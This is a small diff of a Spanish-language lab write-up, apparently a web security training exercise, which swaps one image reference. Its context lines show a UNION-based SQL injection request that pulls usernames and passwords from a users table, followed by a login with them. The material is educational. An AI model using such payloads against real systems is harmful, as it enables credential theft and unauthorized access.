@@ -10,7 +10,7 @@ SImilar a los anteriores cambio la categoria pero para incluir usuario y contras
 
 `GET /filter?category=Accesories'+UNION+SELECT+username+,+password+FROM+users-- HTTP/1.1`
 
-![](../../../.gitbook/assets/imagen%20%28619%29.png)
+![](../../../.gitbook/assets/imagen%20%28622%29.png)
 
 Nos logeamos y listo.
 
